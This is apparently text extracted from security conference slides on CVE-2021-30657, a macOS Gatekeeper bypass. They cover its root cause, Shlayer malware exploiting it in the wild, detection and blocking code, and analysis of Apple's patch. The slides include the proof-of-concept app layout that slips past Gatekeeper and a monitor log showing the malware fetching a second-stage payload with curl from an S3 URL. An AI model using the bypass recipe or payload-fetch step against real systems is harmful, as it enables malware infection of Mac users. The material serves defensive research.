11 
12 
13 
tldr; to be classified as a bundle,  
an item must have an Info.plist !
(lldb) po $rdi 
PST: (path: ~/Downloads/PoC.app/
Contents/MacOS/PoC), (team: (null)), 
(id: (null)), (bundle_id: NOT_A_BUNDLE) 
(lldb) p (BOOL)[$rdi isBundled] 
(BOOL) $1 = NO
...not a bundle
our PoC 
(no Info.plist)
IN SUMMARY
...a script-based "not a bundle" is allowed
% find PoC.app 
PoC.app/Contents 
PoC.app/Contents/MacOS 
PoC.app/Contents/MacOS/PoC 
% file PoC.app/Contents/MacOS/PoC  
PoC.app/Contents/MacOS/PoC: POSIX shell script
An application:
executable, is a script
no Info.plist file 
"All Your Macs Are Belong To Us" 
objective-see.com/blog/blog_0x64.html
Gatekeeper? 
Notarization? 
File Quarantine? 
more details on reversing!
In the Wild!?
...exploited as an 0day
"The technically sophisticated runtime protections in macOS work at the 
very core of your Mac to keep your system safe from malware" -Apple 
THE SEARCH
...and a match!?
executable, is a script
no Info.plist file 
% find /Volumes/Installer  
... 
/Volumes/Installer/Install 
/Volumes/Installer/yWnBJLaF 
/Volumes/Installer/yWnBJLaF/1302.app 
/Volumes/Installer/yWnBJLaF/1302.app/Contents 
/Volumes/Installer/yWnBJLaF/1302.app/Contents/MacOS 
/Volumes/Installer/yWnBJLaF/1302.app/Contents/MacOS/1302 
% ls -lart /Volumes/Installer/Install 
/Volumes/Installer/Install -> yWnBJLaF/1302.app 
% file 1302.app/Contents/MacOS/1302 
Bourne-Again shell script executable (binary data) 
% spctl --assess --type execute 1302.app 
1302.app: rejected / source=no usable signature
"1302.app"
no Info.plist
script-based
the search criteria
unsigned
a candidate application?
ALLOWED TO RUN
...due to the same flaw!
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty 
... 
{ 
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC", 
  "process" : { 
    "path" : "/bin/bash", 
    "arguments" : [ 
      “/bin/bash", 
      "/private/…/AppTranslocation/…/1302.app/Contents/MacOS/1302" 
    ] 
  } 
} 
{ 
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC", 
  "process" : { 
    "path" : “/usr/bin/curl", 
    "arguments" : [ 
      "curl", 
      "-L", 
      "https://bbuseruploads.s3.amazonaws.com/ 
       c237a8d2-0423-4819-8ddf-492e6852c6f7/downloads/…/d9o" 
    ] 
  } 
}
allowed to run!
downloads 2nd stage payload 
 ( via curl )
INFECTION VECTOR
poised search results/infected sites
"Shlayer malware abusing Gatekeeper 
bypass on macOS" -jamf.com
Protections
while awaiting a patch
THE SIMPLE IDEA
…block downloaded, non-notarized items
Can we just detect (and block) the execution any 
download code, that is not notarized?
Detect new process launches
Is item from the internet? 
(and launched by the user)
Is item non-notarized?
while waiting for apple's patch
block!
DETECTING NEW PROCESS LAUNCHES
…via Apple's Endpoint Security Framework (ESF)
"Writing a Process Monitor with Apple's Endpoint Security 
Framework" objective-see.com/blog/blog_0x47.html
//client/event of interest 
@property es_client_t* esClient; 
es_event_type_t events[] = {ES_EVENT_TYPE_AUTH_EXEC}; 
//new client 
//callback will process 'ES_EVENT_TYPE_AUTH_EXEC' events 
es_new_client(&esClient, ^(es_client_t *client, const es_message_t *message) 
{ 
   //TODO: process event 
   // return ES_AUTH_RESULT_ALLOW or ES_AUTH_RESULT_DENY 
} 
//subscribe 
es_subscribe(endpointProcessClient, events, 1);
01 
02 
03 
04 
05 
06 
07 
08 
09 
10 
11 
12 
13 
14 
}
ESF Process Exec Monitor  
(ES_EVENT_TYPE_AUTH_EXEC)
callback for 
process execs
IS ITEM USER-LAUNCHED & FROM THE INTERNET?
…via app translocation status
App Translocation
translocated  
(write-only mount)
void *handle = NULL;| 
bool isTranslocated = false; 
//get 'SecTranslocateIsTranslocatedURL' (private) API 
handle = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_LAZY); 
secTranslocateIsTranslocatedURL = dlsym(handle, "SecTranslocateIsTranslocatedURL"); 
//check (will set isTranslocated variable)  
secTranslocateIsTranslocatedURL([NSURL fileURLWithPath:path], &isTranslocated, NULL);
01 
02 
03 
04 
05 
06 
07 
08 
09 
is item translocated? 
(via (private) SecTranslocateIsTranslocatedURL)
prevent hijack attacks 
(DefCon 2015)
(just) app
IS ITEM NOTARIZED?
…via SecStaticCodeCheckValidity
SecStaticCodeRef staticCode = NULL; 
SecRequirementRef isNotarized = nil; 
//init code ref / requirement string 
SecStaticCodeCreateWithPath(path, kSecCSDefaultFlags, &staticCode); 
SecRequirementCreateWithString(CFSTR("notarized"), kSecCSDefaultFlags, &isNotarized); 
//check against requirement string (will set isNotarized variable) 
SecStaticCodeCheckValidity(staticCode, kSecCSDefaultFlags, isNotarized);
01 
02 
03 
04 
05 
06 
07 
08 
09 
is item notarized? 
(via SecStaticCodeCheckValidity)
or
IN ACTION
…generic protection, before apple's patch!
full code: BlockBlock 
github.com/objective-see/BlockBlock
BlockBlock ...block block'ing
Detections
was I exploited !?
THE EXECPOLICY DATABASE
...updated by syspolicyd (with decision)
% log stream  
syspolicyd: [com.apple.syspolicy.exec:default]  
  Updating flags: ~/PoC.app/Contents/MacOS/PoC, 512" 
# fs_usage -w -f filesystem | grep syspolicyd  
... 
RdData[S]  D=0x052fdb4a  B=0x1000  /dev/disk1s1  
/private/var/db/SystemPolicyConfiguration/ExecPolicy-wal  syspolicyd.55183 
/private/var/db/SystemPolicyConfiguration/ExecPolicy
no item path(s)?
FROM OBJECT_ID TO FILE PATH
...as it's a file inode
% stat ~/Downloads/PoC.app/Contents/MacOS/PoC  
16777220 2354288  ... /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC 
# sqlite3 ExecPolicy 
sqlite> .headers on 
sqlite> SELECT * FROM policy_scan_cache WHERE object_id = 2354288; 
pk|volume_uuid|object_id|fs_type_name|bundle_id|cdhash|team_identifier|
signing_identifier|policy_match|malware_result|flags|mod_time|timestamp|
revocation_check_time|scan_version 
15949|0612A910-2C3C-4B72-9C90-1ED71F3070C3| 2354288 |apfs|NOT_A_BUNDLE||||
7|0|512|1618194723|1618194723|1618194723|4146150715079370460
inode (2354288) -> path (~/Downloads/PoC.app/...)
SCAN.PY
programmatic detection of exploitations
# python scan.py  
volume inode: 16777220 
volume uuid:  0A81F3B1-51D9-3335-B3E3-169C3640360D 
opened 'ExecPolicy' database 
extracted 183 evaluated items 
* malicious application *  
 ~/Downloads/yWnBJLaF/1302.app
programmatic detection
full code: scan.py 
objective-see.com/downloads/blog/blog_0x64/scan.py
#get file path from vol & file inode 
url = Foundation.NSURL.fileURLWithPath_('/.vol/' + str(inode) + '/' + str(item[2])) 
result, file, error = url.getResourceValue_forKey_error_(None, "NSURLCanonicalPathKey", None)
01 
02 
03 
file path, from file inode
an application with:
executable, is script
no Info.plist file 
(also) checks that:
Apple's Patch
reversing CVE-2021-30657 
DIFF’ING SYSPOLICYD
macOS 11.2 (unpatched) vs macOS 11.3 (patched)
Patched as CVE-2021-30657  
(macOS 11.3)
26 blocks / 1008 bytes
VS.
35 blocks / 1692 bytes
BOOL (NSString* path) 
{ 
  //determine if item  
  // is a bundle or not...  
  return  
} 
01 
02 
03 
04 
05 
06 
07 
unpatched
patched (macOS 11.3)
problematic subroutine
NEW CHECKS IN SYSPOLICYD
check #1: is item's path extension "app" ?
BOOL isBundle(NSString* path) 
{ 
  ... 
  //new check 
  // is path extension "app" ?  
  pathExtension = [[component pathExtension] lowercaseString]; 
  if(YES == [rax isEqualToString:@"app"]) { 
      return YES; 
  }
01 
02 
03 
04 
05 
06 
07 
08 
09 
patch pseudo-code
mov        rdx, qword [0x1000bb170]  ; @selector(isEqualToString:) 
mov        qword [rbp+var_F0], rdx 
… 
mov        r13, rax 
mov        rdi, rax                  ; path extension                
mov        rsi, qword [rbp+var_F0]   ; isEqualToString: 
lea        rdx, qword [cfstring_app] ; @"app" 
call       rbx                       ; objc_msgSend 
01 
02 
03 
04 
05 
06 
07 
08 
patch disassembly (snippet)
get path 
extension
is it "app"?
is a bundle
BOOL isBundle(NSString* path) 
{ 
  ... 
  //new check 
  // item contains "Contents/MacOS" ? 
  item = [component URLByAppendingPathComponent:@"Contents/MacOS"]; 
  if(YES == doesFileExist(item.path)) { 
      return YES; 
  }
01 
02 
03 
04 
05 
06 
07 
08 
09 
NEW CHECKS IN SYSPOLICYD
check #2: item contain "Contents/MacOS"?
mov        rdx, qword [0x1000bb2e0]              ; @selector(URLByAppendingPathComponent:) 
mov        qword [rbp+var_130], rdx 
… 
mov        qword [rbp+var_C8], rax 
mov        rdi, rax                                   
mov        r14, qword [rbp+var_130] 
mov        rsi, r14                               ; URLByAppendingPathComponent:                  
lea        rdx, qword [cfstring_Contents_MacOS]   ; @"Contents/MacOS" 
call       rbx                                    ; objc_msgSend 
… 
rax = [NSFileManager defaultManager]; 
rax = [rax retain]; 
r14 = [rax fileExistsAtPath:r12];
01 
02 
03 
04 
05 
06 
07 
08 
09 
10 
11 
12 
13 
patch disassembly (snippet)
build path to 
"Contents/MacOS"
does it exist?
is a bundle
PATCHED!
macOS now secured
contains "Contents/MacOS" 
is ".app"?
Patch summary:
or
is a bundle
}
blocked!
Conclusions
CONCLUSIONS
}
Root cause analysis 
of CVE-2021-30657 
0day exploitation
Protections, detections 
and patch analysis
macOS (still) has 
shallow bugs
go forth: macOS spelunking, reversing,  
malware analysis, & security tool development!
INTERESTED IN LEARNING MORE?
...about malware analysis, macOS security topics?
"Objective by the Sea"
Sept 30/Oct 1
Maui, Hawaii, USA
ObjectiveByTheSea.com
"The Art of Mac Malware” 
free, at: taomm.org
MAHALO!
"Friends of Objective-See" 
Guardian Mobile Firewall
SecureMac
SmugMug
iVerify
Halo Privacy
Join Us! 
Objective-See.com/friends.html
uberAgent
RESOURCES:
Bundles of Joy
"All Your Macs Are Belong To Us"  
objective-see.com/blog/blog_0x64.html 
"macOS Gatekeeper Bypass (2021) Addition" 
cedowens.medium.com/macos-gatekeeper-bypass-2021-edition-5256a2955508 
"Shlayer Malware Abusing Gatekeeper Bypass On macOS" 
www.jamf.com/blog/shlayer-malware-abusing-gatekeeper-bypass-on-macos/